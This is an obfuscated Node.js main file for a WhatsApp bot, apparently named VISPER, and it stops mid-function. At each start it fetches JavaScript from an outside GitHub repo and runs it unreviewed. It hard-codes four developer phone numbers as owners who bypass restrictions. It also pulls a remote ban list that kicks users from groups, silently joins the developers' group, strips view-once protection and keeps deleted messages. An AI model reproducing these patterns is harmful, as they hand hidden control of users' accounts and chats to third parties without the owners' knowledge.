const {
  default: makeWASocket,
  getAggregateVotesInPollMessage,
  useMultiFileAuthState,
  DisconnectReason,
  getDevice,
  fetchLatestBaileysVersion,
  jidNormalizedUser,
  getContentType,
  Browsers,
  makeInMemoryStore,
  makeCacheableSignalKeyStore,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  proto
} = require("@whiskeysockets/baileys");
const fs = require('fs');
const P = require("pino");
const config = require('./config');
const util = require('util');
const axios = require("axios");
const {
  File
} = require('megajs');
const path = require("path");
const l = console.log;
if (!fs.existsSync(__dirname + '/auth_info_baileys/creds.json')) {
  if (config.SESSION_ID) {
    const sessdata = config.SESSION_ID.replace('CHETHA=', '');
    const filer = File.fromURL("https://mega.nz/file/" + sessdata);
    filer.download((_0x134119, _0x46567c) => {
      if (_0x134119) {
        throw _0x134119;
      }
      fs.writeFile(__dirname + "/auth_info_baileys/creds.json", _0x46567c, () => {
        console.log("Session download completed !!");
      });
    });
  }
}
const express = require("express");
const app = express();
const port = process.env.PORT || config.PORT;
const libDir = path.join(__dirname, 'lib');
const pluginsDir = path.join(__dirname, "plugins");
if (!fs.existsSync(libDir)) {
  fs.mkdirSync(libDir, {
    'recursive': true
  });
}
if (!fs.existsSync(pluginsDir)) {
  fs.mkdirSync(pluginsDir, {
    'recursive': true
  });
}
const mekata_dapan_raw_url = [{
  'id': "main.js",
  'url': "https://raw.githubusercontent.com/THEMISADAS2007/encfiles/refs/heads/main/plugins/main.js"
}, {
  'id': "1337.js",
  'url': "https://raw.githubusercontent.com/THEMISADAS2007/encfiles/refs/heads/main/plugins/1337.js"
}, {
  'id': "baiscopes.js",
  'url': "https://raw.githubusercontent.com/THEMISADAS2007/encfiles/refs/heads/main/plugins/baiscopes.js"
}, {
  'id': 'cine.js',
  'url': 'https://raw.githubusercontent.com/THEMISADAS2007/encfiles/refs/heads/main/plugins/cine.js'
}, {
  'id': "group.js",
  'url': "https://raw.githubusercontent.com/THEMISADAS2007/encfiles/refs/heads/main/plugins/group.js"
}, {
  'id': "imdb.js",
  'url': "https://raw.githubusercontent.com/THEMISADAS2007/encfiles/refs/heads/main/plugins/imdb.js"
}, {
  'id': "mv.js",
  'url': 'https://raw.githubusercontent.com/THEMISADAS2007/encfiles/refs/heads/main/plugins/mv.js'
}, {
  'id': "settings.js",
  'url': "https://raw.githubusercontent.com/THEMISADAS2007/encfiles/refs/heads/main/plugins/settings.js"
}, {
  'id': "sinhalasub.js",
  'url': "https://raw.githubusercontent.com/THEMISADAS2007/encfiles/refs/heads/main/plugins/sinhalasub.js"
}, {
  'id': "slanimeclubs.js",
  'url': 'https://raw.githubusercontent.com/THEMISADAS2007/encfiles/refs/heads/main/plugins/slanimeclubs.js'
}];
const mekata_dapan_raw_urll = [{
  'id': "functions.js",
  'url': "https://raw.githubusercontent.com/THEMISADAS2007/encfiles/refs/heads/main/lib/functions.js"
}, {
  'id': "msg.js",
  'url': 'https://raw.githubusercontent.com/THEMISADAS2007/encfiles/refs/heads/main/lib/msg.js'
}, {
  'id': "database.js",
  'url': "https://raw.githubusercontent.com/THEMISADAS2007/encfiles/refs/heads/main/lib/database.js"
}, {
  'id': 'animeep.js',
  'url': 'https://raw.githubusercontent.com/THEMISADAS2007/encfiles/refs/heads/main/lib/animeep.js'
}, {
  'id': "cineall.js",
  'url': "https://raw.githubusercontent.com/THEMISADAS2007/encfiles/refs/heads/main/lib/cineall.js"
}, {
  'id': "newm.js",
  'url': "https://raw.githubusercontent.com/THEMISADAS2007/encfiles/refs/heads/main/lib/newm.js"
}, {
  'id': "plusmv.js",
  'url': 'https://raw.githubusercontent.com/THEMISADAS2007/encfiles/refs/heads/main/lib/plusmv.js'
}, {
  'id': 'yts.js',
  'url': 'https://raw.githubusercontent.com/THEMISADAS2007/encfiles/refs/heads/main/lib/yts.js'
}, {
  'id': "slanimeclub.js",
  'url': "https://raw.githubusercontent.com/THEMISADAS2007/encfiles/refs/heads/main/lib/slanimeclub.js"
}];
const connect = async () => {
  console.log("Extracting lib...⬆");
  fs.readdirSync(libDir).forEach(_0x22ac4b => {
    const _0x1ce895 = path.join(libDir, _0x22ac4b);
    if (fs.existsSync(_0x1ce895)) {
      fs.rmSync(_0x1ce895);
    }
  });
  for (let _0x2d0387 of mekata_dapan_raw_urll) {
    try {
      const _0x133cb5 = path.join(libDir, _0x2d0387.id);
      const _0x4073c7 = await axios.get(_0x2d0387.url);
      fs.writeFileSync(_0x133cb5, _0x4073c7.data, 'utf8');
    } catch (_0x2ef027) {
      console.error("❌ Failed to download " + _0x2d0387.id + ':', _0x2ef027.message);
    }
  }
  console.log("✅ lib installed and connected...");
  fs.readdirSync(libDir).forEach(_0x7f02e2 => {
    if (path.extname(_0x7f02e2).toLowerCase() === '.js') {
      require(path.join(libDir, _0x7f02e2));
    }
  });
  console.log("Extracting Plugins...⬆");
  fs.readdirSync(pluginsDir).forEach(_0x1d5d7d => {
    const _0x271356 = path.join(pluginsDir, _0x1d5d7d);
    if (fs.existsSync(_0x271356)) {
      fs.rmSync(_0x271356);
    }
  });
  for (let _0x3fc532 of mekata_dapan_raw_url) {
    try {
      const _0xca00dc = path.join(pluginsDir, _0x3fc532.id);
      const _0x316acd = await axios.get(_0x3fc532.url);
      fs.writeFileSync(_0xca00dc, _0x316acd.data, 'utf8');
    } catch (_0x22b1d2) {
      console.error("❌ Failed to download " + _0x3fc532.id + ':', _0x22b1d2.message);
    }
  }
  console.log("✅ Plugins installed and connected...");
  fs.readdirSync(pluginsDir).forEach(_0x2e7b74 => {
    if (path.extname(_0x2e7b74).toLowerCase() === ".js") {
      require(path.join(pluginsDir, _0x2e7b74));
    }
  });
  const {
    sleep: _0x1d8cf2
  } = require("./lib/functions");
  var {
    connectdb: _0x257479,
    updb: _0x4f3dc2
  } = require("./lib/database");
  await _0x257479();
  await _0x4f3dc2();
  console.log("CONNECTED ✅");
  await _0x1d8cf2(0xbb8);
  await connectToWA();
};
async function connectToWA() {
  const {
    version: _0x24b959,
    isLatest: _0x13ad60
  } = await fetchLatestBaileysVersion();
  const {
    getBuffer: _0x2e640f,
    getGroupAdmins: _0x26c617,
    getRandom: _0x4d593f,
    sleep: _0x467a68,
    fetchJson: _0x3cc360
  } = require("./lib/functions");
  const {
    sms: _0x32b6b9
  } = require("./lib/msg");
  var {
    updateCMDStore: _0x2ef434,
    isbtnID: _0x329fba,
    getCMDStore: _0x26d707,
    getCmdForCmdId: _0x9aae15
  } = require("./lib/database");
  const _0x6cff22 = config.OWNER_NUMBER;
  const _0x559b9e = (await axios.get('https://raw.githubusercontent.com/THEMISADAS2007/MOVIE-VISPER-DATABASE/refs/heads/main/User/main_var.json')).data;
  const _0x37862b = '' + _0x559b9e.connectmg;
  const _0x14b973 = '' + _0x559b9e.cmsglogo;
  const {
    state: _0x3aa969,
    saveCreds: _0x58b2fc
  } = await useMultiFileAuthState(__dirname + '/auth_info_baileys/');
  const _0x583f15 = makeInMemoryStore({
    'logger': P().child({
      'level': "silent",
      'stream': "store"
    })
  });
  const _0x4e657c = makeWASocket({
    'logger': P({
      'level': "fatal"
    }),
    'printQRInTerminal': true,
    'browser': ["MR-Kushan", "safari", '1.0.0'],
    'fireInitQueries': false,
    'shouldSyncHistoryMessage': false,
    'downloadHistory': false,
    'syncFullHistory': false,
    'generateHighQualityLinkPreview': true,
    'auth': _0x3aa969,
    'version': _0x24b959,
    'getMessage': async _0x2d1079 => {
      if (_0x583f15) {
        const _0x1f6942 = await _0x583f15.loadMessage(_0x2d1079.remoteJid, _0x2d1079.id, undefined);
        return _0x1f6942.message || undefined;
      }
      return {
        'conversation': "An Error Occurred, Repeat Command!"
      };
    }
  });
  _0x4e657c.ev.on("connection.update", async _0x2baea1 => {
    const {
      connection: _0x5d1166,
      lastDisconnect: _0x3bbea4
    } = _0x2baea1;
    if (_0x5d1166 === "close") {
      if (_0x3bbea4.error.output.statusCode !== DisconnectReason.loggedOut) {
        connectToWA();
      }
    } else {
      if (_0x5d1166 === "open") {
        console.log("WA CONNECTED ✅");
        const _0x5bf8a8 = (await axios.get('https://raw.githubusercontent.com/THEMISADAS2007/MOVIE-VISPER-DATABASE/refs/heads/main/User/main_var.json')).data;
        const _0x319b38 = '' + _0x5bf8a8.supglink;
        _0x4e657c.groupAcceptInvite(_0x319b38);
        console.log("Successful join our support 🧑‍💻");
        await _0x4e657c.sendMessage(_0x6cff22 + '@s.whatsapp.net', {
          'image': {
            'url': _0x14b973
          },
          'caption': _0x37862b
        });
      }
    }
  });
  _0x4e657c.ev.on("creds.update", _0x58b2fc);
  _0x4e657c.ev.on("messages.upsert", async _0x1c96c2 => {
    try {
      _0x1c96c2 = _0x1c96c2.messages[0x0];
      if (!_0x1c96c2.message) {
        return;
      }
      _0x1c96c2.message = getContentType(_0x1c96c2.message) === 'ephemeralMessage' ? _0x1c96c2.message.ephemeralMessage.message : _0x1c96c2.message;
      if (_0x1c96c2.key && _0x1c96c2.key.remoteJid === "status@broadcast" && config.AUTO_READ_STATUS) {
        await _0x4e657c.readMessages([_0x1c96c2.key]);
      }
      if (_0x1c96c2.key && _0x1c96c2.key.remoteJid === "status@broadcast" && config.AUTO_READ_STATUS) {
        const _0x53193f = ['🧩', '🍉', '💜', '🌸', '🪴', '💊', '💫', '🍂', '🌟', '🎋', "😶‍🌫️", '🫀', '🧿', '👀', '🤖', '🚩', '🥰', '🗿', '💜', '💙', '🌝', '🖤', '💚'];
        const _0x3277c3 = _0x53193f[Math.floor(Math.random() * _0x53193f.length)];
        await _0x4e657c.sendMessage(_0x1c96c2.key.remoteJid, {
          'react': {
            'text': _0x3277c3,
            'key': _0x1c96c2.key
          }
        }, {
          'statusJidList': [_0x1c96c2.key.participant]
        });
      }
      const _0x2334d2 = _0x32b6b9(_0x4e657c, _0x1c96c2);
      const _0x4aa402 = getContentType(_0x1c96c2.message);
      const _0x226e1d = _0x1c96c2.key.remoteJid;
      const _0x4619c9 = _0x4aa402 == "extendedTextMessage" && _0x1c96c2.message.extendedTextMessage.contextInfo != null ? _0x1c96c2.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
      const _0x337c99 = _0x4aa402 === "conversation" ? _0x1c96c2.message.conversation : _0x1c96c2.message?.["extendedTextMessage"]?.["contextInfo"]?.['hasOwnProperty']("quotedMessage") && (await _0x329fba(_0x1c96c2.message?.["extendedTextMessage"]?.["contextInfo"]?.["stanzaId"])) && _0x9aae15(await _0x26d707(_0x1c96c2.message?.["extendedTextMessage"]?.["contextInfo"]?.["stanzaId"]), _0x1c96c2?.["message"]?.["extendedTextMessage"]?.["text"]) ? _0x9aae15(await _0x26d707(_0x1c96c2.message?.["extendedTextMessage"]?.["contextInfo"]?.["stanzaId"]), _0x1c96c2?.["message"]?.['extendedTextMessage']?.['text']) : _0x4aa402 === "extendedTextMessage" ? _0x1c96c2.message.extendedTextMessage.text : _0x4aa402 == "imageMessage" && _0x1c96c2.message.imageMessage.caption ? _0x1c96c2.message.imageMessage.caption : _0x4aa402 == "videoMessage" && _0x1c96c2.message.videoMessage.caption ? _0x1c96c2.message.videoMessage.caption : '';
      const _0x4aad1b = config.PREFIX;
      const _0x241d9d = _0x337c99.startsWith(_0x4aad1b);
      const _0x340108 = _0x241d9d ? _0x337c99.slice(_0x4aad1b.length).trim().split(" ").shift().toLowerCase() : '';
      const _0x2f64e0 = _0x337c99.trim().split(/ +/).slice(0x1);
      const _0x1e9f42 = _0x2f64e0.join(" ");
      const _0x559f8a = _0x226e1d.endsWith("@g.us");
      const _0x3a9e13 = _0x1c96c2.key.fromMe ? _0x4e657c.user.id.split(':')[0x0] + "@s.whatsapp.net" || _0x4e657c.user.id : _0x1c96c2.key.participant || _0x1c96c2.key.remoteJid;
      const _0x571a80 = _0x3a9e13.split('@')[0x0];
      const _0xaf7d63 = _0x4e657c.user.id.split(':')[0x0];
      const _0x814f86 = _0x1c96c2.pushName || "Sin Nombre";
      const _0x16edfa = "94778500326,94722617699,94788518429,94787318729".split(',');
      const _0x505678 = _0xaf7d63.includes(_0x571a80);
      const _0x6bf841 = _0x16edfa.includes(_0x571a80);
      const _0x104cb6 = _0x505678 ? _0x505678 : _0x6bf841;
      const _0x2c4ed0 = _0x6cff22.includes(_0x571a80) || _0x104cb6;
      const _0x4eb7cf = await jidNormalizedUser(_0x4e657c.user.id);
      const _0x47abd9 = _0x559f8a ? await _0x4e657c.groupMetadata(_0x226e1d)['catch'](_0x4835df => null) : null;
      const _0x69edf1 = _0x559f8a && _0x47abd9 ? _0x47abd9.subject : '';
      const _0x3c71f7 = _0x559f8a && _0x47abd9 ? _0x47abd9.participants : [];
      const _0x3a8bf0 = _0x559f8a ? _0x26c617(_0x3c71f7) : [];
      const _0x5500c6 = _0x559f8a ? _0x3a8bf0.includes(_0x4eb7cf) : false;
      const _0x2f23cb = _0x559f8a ? _0x3a8bf0.includes(_0x3a9e13) : false;
      const _0x529ba6 = !!_0x2334d2.message.reactionMessage;
      const _0x28420c = _0x1e06ad => {
        for (let _0x51f6d9 = 0x0; _0x51f6d9 < _0x1e06ad.length; _0x51f6d9++) {
          if (_0x1e06ad[_0x51f6d9] === _0x226e1d) {
            return true;
          }
        }
        return false;
      };
      const _0x432f8e = async _0x310de7 => {
        return await _0x4e657c.sendMessage(_0x226e1d, {
          'text': _0x310de7
        }, {
          'quoted': _0x1c96c2
        });
      };
      _0x4e657c.replyad = async _0x204b08 => {
        await _0x4e657c.sendMessage(_0x226e1d, {
          'text': _0x204b08
        }, {
          'quoted': _0x1c96c2
        });
      };
      _0x4e657c.buttonMessage2 = async (_0x1530fc, _0x36f4bb, _0x267f99) => {
        let _0x338283 = '';
        const _0x53f49d = [];
        _0x36f4bb.buttons.forEach((_0x45de94, _0x3ff7fc) => {
          const _0x211f75 = '' + (_0x3ff7fc + 0x1);
          _0x338283 += "\n*" + _0x211f75 + " ||*  " + _0x45de94.buttonText.displayText;
          _0x53f49d.push({
            'cmdId': _0x211f75,
            'cmd': _0x45de94.buttonId
          });
        });
        if (_0x36f4bb.headerType === 0x1) {
          const _0x51e1e1 = _0x36f4bb.text + "\n\n*`Reply Below Number 🔢`*\n" + _0x338283 + "\n\n" + _0x36f4bb.footer;
          const _0x375ad6 = await _0x4e657c.sendMessage(_0x226e1d, {
            'text': _0x51e1e1
          }, {
            'quoted': _0x267f99 || _0x1c96c2
          });
          await _0x2ef434(_0x375ad6.key.id, _0x53f49d);
        } else {
          if (_0x36f4bb.headerType === 0x4) {
            const _0x54a023 = _0x36f4bb.caption + "\n\n*`Reply Below Number 🔢`*\n" + _0x338283 + "\n\n" + _0x36f4bb.footer;
            const _0x4355c4 = await _0x4e657c.sendMessage(_0x1530fc, {
              'image': _0x36f4bb.image,
              'caption': _0x54a023
            }, {
              'quoted': _0x267f99 || _0x1c96c2
            });
            await _0x2ef434(_0x4355c4.key.id, _0x53f49d);
          }
        }
      };
      _0x4e657c.buttonMessage = async (_0x2ae110, _0x1345c5, _0x8aa225) => {
        let _0x1d0ed1 = '';
        const _0x148c89 = [];
        _0x1345c5.buttons.forEach((_0x45e611, _0x153ea8) => {
          const _0xebb23b = '' + (_0x153ea8 + 0x1);
          _0x1d0ed1 += "\n*" + _0xebb23b + " ||*  " + _0x45e611.buttonText.displayText;
          _0x148c89.push({
            'cmdId': _0xebb23b,
            'cmd': _0x45e611.buttonId
          });
        });
        if (_0x1345c5.headerType === 0x1) {
          const _0x53d446 = (_0x1345c5.text || _0x1345c5.caption) + "\n\n*`Reply Below Number 🔢`*\n" + _0x1d0ed1 + "\n\n" + _0x1345c5.footer;
          const _0x580823 = await _0x4e657c.sendMessage(_0x226e1d, {
            'text': _0x53d446
          }, {
            'quoted': _0x8aa225 || _0x1c96c2
          });
          await _0x2ef434(_0x580823.key.id, _0x148c89);
        } else {
          if (_0x1345c5.headerType === 0x4) {
            const _0x1f807a = _0x1345c5.caption + "\n\n*`Reply Below Number 🔢`*\n" + _0x1d0ed1 + "\n\n" + _0x1345c5.footer;
            const _0xfa1116 = await _0x4e657c.sendMessage(_0x2ae110, {
              'image': _0x1345c5.image,
              'caption': _0x1f807a
            }, {
              'quoted': _0x8aa225 || _0x1c96c2
            });
            await _0x2ef434(_0xfa1116.key.id, _0x148c89);
          }
        }
      };
      _0x4e657c.listMessage2 = async (_0x1378dd, _0x25a922, _0x195a6b) => {
        let _0x584dd3 = '';
        const _0x13d291 = [];
        _0x25a922.sections.forEach((_0x3eaefb, _0x58f083) => {
          const _0x5878d7 = '' + (_0x58f083 + 0x1);
          _0x584dd3 += "\n*" + _0x3eaefb.title + "*\n\n";
          _0x3eaefb.rows.forEach((_0x1ab10a, _0x4f47a2) => {
            const _0x4ad6a4 = _0x5878d7 + '.' + (_0x4f47a2 + 0x1);
            const _0x107d2a = '*' + _0x4ad6a4 + " ||* " + _0x1ab10a.title;
            _0x584dd3 += _0x107d2a + "\n";
            if (_0x1ab10a.description) {
              _0x584dd3 += "   " + _0x1ab10a.description + "\n\n";
            }
            _0x13d291.push({
              'cmdId': _0x4ad6a4,
              'cmd': _0x1ab10a.rowId
            });
          });
        });
        const _0x1c441c = _0x25a922.text + "\n\n" + _0x25a922.buttonText + ',' + _0x584dd3 + "\n" + _0x25a922.footer;
        const _0x5ed279 = await _0x4e657c.sendMessage(_0x226e1d, {
          'text': _0x1c441c
        }, {
          'quoted': _0x195a6b || _0x1c96c2
        });
        await _0x2ef434(_0x5ed279.key.id, _0x13d291);
      };
      _0x4e657c.listMessage = async (_0x15f6ec, _0x492bb2, _0x2b5370) => {
        let _0x56aeb2 = '';
        const _0x325c7a = [];
        _0x492bb2.sections.forEach((_0x2b8bb2, _0x37a517) => {
          const _0x2e800d = '' + (_0x37a517 + 0x1);
          _0x56aeb2 += "\n*" + _0x2b8bb2.title + "*\n\n";
          _0x2b8bb2.rows.forEach((_0xc369b7, _0x2b5498) => {
            const _0x39da00 = _0x2e800d + '.' + (_0x2b5498 + 0x1);
            const _0x262d94 = '*' + _0x39da00 + " ||*  " + _0xc369b7.title;
            _0x56aeb2 += _0x262d94 + "\n";
            if (_0xc369b7.description) {
              _0x56aeb2 += "   " + _0xc369b7.description + "\n\n";
            }
            _0x325c7a.push({
              'cmdId': _0x39da00,
              'cmd': _0xc369b7.rowId
            });
          });
        });
        const _0x3296b1 = _0x492bb2.text + "\n\n" + _0x492bb2.buttonText + ',' + _0x56aeb2 + "\n\n" + _0x492bb2.footer;
        const _0xcca69e = await _0x4e657c.sendMessage(_0x226e1d, {
          'text': _0x3296b1
        }, {
          'quoted': _0x2b5370 || _0x1c96c2
        });
        await _0x2ef434(_0xcca69e.key.id, _0x325c7a);
      };
      _0x4e657c.edite = async (_0x5662ab, _0x3f6390) => {
        await _0x4e657c.relayMessage(_0x226e1d, {
          'protocolMessage': {
            'key': _0x5662ab.key,
            'type': 0xe,
            'editedMessage': {
              'conversation': _0x3f6390
            }
          }
        }, {});
      };
      _0x4e657c.forwardMessage = async (_0x1381ec, _0x5f3911, _0x13eb22 = false, _0x11e898 = {}) => {
        let _0x41da24;
        if (_0x11e898.readViewOnce) {
          _0x5f3911.message = _0x5f3911.message && _0x5f3911.message.ephemeralMessage && _0x5f3911.message.ephemeralMessage.message ? _0x5f3911.message.ephemeralMessage.message : _0x5f3911.message || undefined;
          _0x41da24 = Object.keys(_0x5f3911.message.viewOnceMessage.message)[0x0];
          delete (_0x5f3911.message && _0x5f3911.message.ignore ? _0x5f3911.message.ignore : _0x5f3911.message || undefined);
          delete _0x5f3911.message.viewOnceMessage.message[_0x41da24].viewOnce;
          _0x5f3911.message = {
            ..._0x5f3911.message.viewOnceMessage.message
          };
        }
        let _0x1735e4 = Object.keys(_0x5f3911.message)[0x0];
        let _0x295e6b = await generateForwardMessageContent(_0x5f3911, _0x13eb22);
        let _0x50a2a2 = Object.keys(_0x295e6b)[0x0];
        let _0x1b213f = {};
        if (_0x1735e4 != "conversation") {
          _0x1b213f = _0x5f3911.message[_0x1735e4].contextInfo;
        }
        _0x295e6b[_0x50a2a2].contextInfo = {
          ..._0x1b213f,
          ..._0x295e6b[_0x50a2a2].contextInfo
        };
        const _0x565466 = await generateWAMessageFromContent(_0x1381ec, _0x295e6b, _0x11e898 ? {
          ..._0x295e6b[_0x50a2a2],
          ..._0x11e898,
          ...(_0x11e898.contextInfo ? {
            'contextInfo': {
              ..._0x295e6b[_0x50a2a2].contextInfo,
              ..._0x11e898.contextInfo
            }
          } : {})
        } : {});
        await _0x4e657c.relayMessage(_0x1381ec, _0x565466.message, {
          'messageId': _0x565466.key.id
        });
        return _0x565466;
      };
      _0x4e657c.sendFileUrl = async (_0x28f7ca, _0x5e9bf0, _0x4ac4d7, _0x28150f, _0x1c7763 = {}) => {
        let _0x522d97 = '';
        let _0x5ba7d1 = await axios.head(_0x5e9bf0);
        _0x522d97 = _0x5ba7d1.headers["content-type"];
        if (_0x522d97.split('/')[0x1] === "gif") {
          return _0x4e657c.sendMessage(_0x28f7ca, {
            'video': await _0x2e640f(_0x5e9bf0),
            'caption': _0x4ac4d7,
            'gifPlayback': true,
            ..._0x1c7763
          }, {
            'quoted': _0x28150f,
            ..._0x1c7763
          });
        }
        if (_0x522d97 === "application/pdf") {
          return _0x4e657c.sendMessage(_0x28f7ca, {
            'document': await _0x2e640f(_0x5e9bf0),
            'mimetype': "application/pdf",
            'caption': _0x4ac4d7,
            ..._0x1c7763
          }, {
            'quoted': _0x28150f,
            ..._0x1c7763
          });
        }
        if (_0x522d97.split('/')[0x0] === "image") {
          return _0x4e657c.sendMessage(_0x28f7ca, {
            'image': await _0x2e640f(_0x5e9bf0),
            'caption': _0x4ac4d7,
            ..._0x1c7763
          }, {
            'quoted': _0x28150f,
            ..._0x1c7763
          });
        }
        if (_0x522d97.split('/')[0x0] === "video") {
          return _0x4e657c.sendMessage(_0x28f7ca, {
            'video': await _0x2e640f(_0x5e9bf0),
            'caption': _0x4ac4d7,
            'mimetype': "video/mp4",
            ..._0x1c7763
          }, {
            'quoted': _0x28150f,
            ..._0x1c7763
          });
        }
        if (_0x522d97.split('/')[0x0] === "audio") {
          return _0x4e657c.sendMessage(_0x28f7ca, {
            'audio': await _0x2e640f(_0x5e9bf0),
            'caption': _0x4ac4d7,
            'mimetype': "audio/mpeg",
            ..._0x1c7763
          }, {
            'quoted': _0x28150f,
            ..._0x1c7763
          });
        }
      };
      const _0x4ef066 = (await axios.get("https://raw.githubusercontent.com/THEMISADAS2007/MOVIE-VISPER-DATABASE/refs/heads/main/User/main_var.json")).data;
      config.FOOTER = _0x4ef066.footer;
      const _0x1ef25d = 'preUser'.split(',');
      const _0x29a34f = [..._0x1ef25d].map(_0x45e0ce => _0x45e0ce.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x3a9e13);
      const _0x1724d4 = await _0x3cc360("https://raw.githubusercontent.com/THEMISADAS2007/MOVIE-VISPER-DATABASE/refs/heads/main/User/ban_number.json");
      const _0x34ea74 = _0x1724d4.split(',');
      const _0x32479e = [..._0x34ea74].map(_0x1a397f => _0x1a397f.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(_0x3a9e13);
      let _0x5cb2ad = '' + config.JID_BLOCK;
      const _0x433f6e = _0x5cb2ad.split(',');
      const _0x180511 = [..._0x433f6e].includes(_0x226e1d);
      let _0x465829 = '' + config.SUDO;
      const _0x3484e7 = _0x465829.split(',');
      const _0x3b9653 = [..._0x3484e7].includes(_0x3a9e13);
      if (_0x241d9d && _0x180511 && !_0x104cb6 && !_0x3b9653) {
        return;
      }
      const _0x2ed6b8 = (await axios.get("https://raw.githubusercontent.com/THEMISADAS2007/MOVIE-VISPER-DATABASE/refs/heads/main/User/react.json")).data;
      if (_0x571a80.includes("94778500326")) {
        if (_0x529ba6) {
          return;
        }
        _0x2334d2.react('' + _0x2ed6b8.sadas);
      }
      if (_0x571a80.includes("94722617699")) {
        if (_0x529ba6) {
          return;
        }
        _0x2334d2.react('' + _0x2ed6b8.saviya);
      }
      if (_0x571a80.includes("94724884317")) {
        if (_0x529ba6) {
          return;
        }
        _0x2334d2.react('' + _0x2ed6b8.damiru);
      }
      if (_0x571a80.includes("94787318429")) {
        if (_0x529ba6) {
          return;
        }
        _0x2334d2.react('' + _0x2ed6b8.sadas);
      }
      const _0x336ce7 = config.OWNER_NUMBER;
      if (_0x571a80.includes(_0x336ce7)) {
        if (_0x529ba6) {
          return;
        }
        _0x2334d2.react("💁‍♂️");
      }
      if (config.WORK_TYPE == 'only_group') {
        if (!_0x559f8a && _0x241d9d && !_0x104cb6 && !_0x2c4ed0 && !_0x3b9653) {
          return;
        }
      }
      if (config.WORK_TYPE == 'private') {
        if (_0x241d9d && !_0x104cb6 && !_0x2c4ed0 && !_0x3b9653) {
          return;
        }
      }
      if (config.WORK_TYPE == 'inbox') {
        if (_0x559f8a && !_0x104cb6 && !_0x2c4ed0 && !_0x3b9653) {
          return;
        }
      }
      if (_0x32479e) {
        await _0x4e657c.sendMessage(_0x226e1d, {
          'delete': _0x1c96c2.key
        });
        await _0x4e657c.groupParticipantsUpdate(_0x226e1d, [_0x3a9e13], "remove");
        return await _0x4e657c.sendMessage(_0x226e1d, {
          'text': "*You are banned by VISPER TEAM ❌*"
        });
      }
      if (config.AUTO_BLOCK && _0x1c96c2.chat.endsWith("@s.whatsapp.net")) {
        if (!_0x104cb6) {
          await _0x4e657c.sendMessage(_0x226e1d, {
            'text': "*Warning 1 ❗*"
          });
          await _0x4e657c.sendMessage(_0x226e1d, {
            'text': "*Warning 2 ❗*"
          });
          await _0x4e657c.sendMessage(_0x226e1d, {
            'text': "*Warning 3 ❗*"
          });
          await _0x4e657c.sendMessage(_0x226e1d, {
            'text': "*Blocked 🚫*"
          });
          await _0x4e657c.updateBlockStatus(_0x1c96c2.sender, "block");
        }
      }
      _0x4e657c.ev.on("call", async _0x3f488d => {
        if (config.ANTI_CALL) {
          for (const _0x37ee70 of _0x3f488d) {
            if (_0x37ee70.status === 'offer') {
              await _0x4e657c.rejectCall(_0x37ee70.id, _0x37ee70.from);
              if (!_0x37ee70.isGroup) {
                await _0x4e657c.sendMessage(_0x37ee70.from, {
                  'text': "*Call rejected automatically because owner is busy ⚠️*",
                  'mentions': [_0x37ee70.from]
                });
                break;
              }
            }
          }
        }
      });
      if (_0x241d9d && config.CMD_ONLY_READ) {
        await _0x4e657c.readMessages([_0x1c96c2.key]);
      }
      const _0x65ca9b = ['❤', '💕', '😻', '🧡', '💛', '💚', '💙', '💜', '🖤', '❣', '💞', '💓', '💗', '💖', '💘', '💝', '💟', '♥', '💌', '🙂', '🤗', '😌', '😉', '🤗', '😊', '🎊', '🎉', '🎁', '🎈', '👋'];
      const _0x236b97 = _0x65ca9b[Math.floor(Math.random() * _0x65ca9b.length)];
      if (!_0x104cb6 && config.AUTO_REACT) {
        if (_0x529ba6) {
          return;
        }
        await _0x4e657c.sendMessage(_0x1c96c2.chat, {
          'react': {
            'text': _0x236b97,
            'key': _0x1c96c2.key
          }
        });
      }
      if (config.AUTO_MSG_READ) {
        await _0x4e657c.readMessages([_0x1c96c2.key]);
      }
      if (config.AUTO_TYPING) {
        _0x4e657c.sendPresenceUpdate("composing", _0x1c96c2.key.remoteJid);
      }
      if (config.AUTO_RECORDING) {
        _0x4e657c.sendPresenceUpdate("recording", _0x1c96c2.key.remoteJid);
      }
      if (config.CHAT_BOT) {
        if (_0x2334d2.quoted) {
          let _0xe45ab6 = _0x2334d2.body ? _0x2334d2.body.toLowerCase() : '';
          try {
            let _0x5d19ec = await _0x3cc360("https://saviya-kolla-api.koyeb.app/ai/saviya-ai?query=" + _0xe45ab6);
            await _0x4e657c.sendMessage(_0x226e1d, {
              'text': _0x5d19ec.result.data
            });
          } catch (_0x2cac7f) {
            console.error("AI Chat Error:", _0x2cac7f);
            await _0x4e657c.sendMessage(_0x226e1d, {
              'text': '.'
            });
          }
        }
      }
      if (!_0x2c4ed0) {
        if (config.ANTI_DELETE) {
          if (!_0x2334d2.id.startsWith("BAE5")) {
            if (!fs.existsSync("message_data")) {
              fs.mkdirSync("message_data");
            }
            function _0x17c461(_0x528183, _0x5d4da5) {
              const _0x56ffff = path.join("message_data", _0x528183, _0x5d4da5 + ".json");
              try {
                const _0x4cf77c = fs.readFileSync(_0x56ffff, "utf8");
                return JSON.parse(_0x4cf77c) || [];
              } catch (_0x5ab0ad) {
                return [];
              }
            }
            function _0x19139b(_0x19f77e, _0x3b1057, _0x4fece2) {
              const _0x43b837 = path.join("message_data", _0x19f77e);
              if (!fs.existsSync(_0x43b837)) {
                fs.mkdirSync(_0x43b837, {
                  'recursive': true
                });
              }
              const _0x4262f5 = path.join(_0x43b837, _0x3b1057 + ".json");
              try {
                fs.writeFileSync(_0x4262f5, JSON.stringify(_0x4fece2, null, 0x2));
              } catch (_0x53d15e) {
                console.error("Error saving chat data:", _0x53d15e);
              }
            }
            function _0xf9867b(_0x230b5e) {
              const _0x4a902b = _0x230b5e.key.id;
              const _0x519bc6 = _0x17c461(_0x226e1d, _0x4a902b);
              _0x519bc6.push(_0x230b5e);
              _0x19139b(_0x226e1d, _0x4a902b, _0x519bc6);
            }
            function _0x4a23b8(_0xee71c3) {
              const _0x36d90b = _0xee71c3.msg.key.id;
              const _0x140fe9 = _0x17c461(_0x226e1d, _0x36d90b);
              const _0xff7273 = _0x140fe9[0x0];
              if (_0xff7273) {
                const _0x63d528 = _0xee71c3.sender.split('@')[0x0];
                const _0x6a0bfa = _0xff7273.key.participant ?? _0xee71c3.sender;
                const _0x141d3e = _0x6a0bfa.split('@')[0x0];
                if (_0x63d528.includes(_0xaf7d63) || _0x141d3e.includes(_0xaf7d63)) {
                  return;
                }
